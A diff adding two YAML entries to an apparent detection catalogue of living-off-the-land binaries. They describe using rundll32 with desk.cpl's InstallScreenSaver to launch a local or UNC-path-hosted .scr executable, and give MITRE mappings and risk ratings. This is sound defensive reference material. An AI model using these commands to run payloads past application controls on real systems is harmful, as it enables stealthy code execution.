@@ -1,0 +1,40 @@
+- command: rundll32.exe desk.cpl,InstallScreenSaver C:\temp\file.scr
+  description: Launch a target executable which has a .scr extension by utilizing InstallScreenSaver functionality from desk.cpl.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Libraries/Desk/
+  risk: High
+  risk_reason: Manual usage of rundll32 with desk.cpl is a suspicious activity.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically abnormal in most organizations.
+  tool: desk
+  threatactors:
+    N/A:
+      - N/A
+- command: rundll32.exe desk.cpl,InstallScreenSaver \\127.0.0.1\c$\temp\file.scr
+  description: Launch a remotely-hosted target executable which has a .scr extension by utilizing InstallScreenSaver functionality from desk.cpl.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Libraries/Desk/
+  risk: High
+  risk_reason: Manual usage of rundll32 with desk.cpl is a suspicious activity.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically abnormal in most organizations.
+  tool: desk
+  threatactors:
+    N/A:
+      - N/A
